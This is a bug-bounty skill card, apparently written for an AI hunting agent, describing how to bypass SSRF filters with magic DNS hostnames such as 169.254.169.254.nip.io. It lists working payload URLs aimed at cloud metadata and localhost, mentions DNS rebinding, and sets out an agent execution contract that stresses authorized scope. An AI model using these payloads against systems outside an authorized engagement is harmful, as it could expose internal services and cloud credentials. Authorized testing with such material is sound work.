# SKILL: SSRF Magic DNS ([nip.io](http://nip.io) / [xip.io](http://xip.io)) — filter checks string, not resolved IP

**Skill id:** `tip/ssrf-magic-dns-nipiohttpnipio-xipiohttpxipio-filter-checks-string-not-resolved-ip`  
**Category:** SSRF  
**Rating:** 🔥 قوية  
**Status:** Not started  
**Notion:** https://app.notion.com/p/41ddac31e880811b8d74e7ceb406ea38  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **SSRF**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

Many SSRF filters block the literal string 169.254.169.254 or [localhost](http://localhost) but do not re-check after DNS resolution (TOCTOU). Magic DNS providers resolve a hostname that embeds the IP, so the string looks external while the resolved IP is metadata/internal. Confirm with real metadata markers in the body, not status alone. Stay in authorized scope.

## Payload / Code

```
[http://169.254.169.254.nip.io/latest/meta-data/](http://169.254.169.254.nip.io/latest/meta-data/)
[http://169.254.169.254.xip.io/latest/meta-data/](http://169.254.169.254.xip.io/latest/meta-data/)
[http://127.0.0.1.nip.io/](http://127.0.0.1.nip.io/)
Also: short-TTL DNS rebinding / CNAME of allowlisted-looking host → internal IP
```

## Source

Real full-read SSRF reports (e.g. [169.254.169.254.nip.io](http://169.254.169.254.nip.io) accepted while literal IP blocked) + Twitter SSRF tips 2026

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
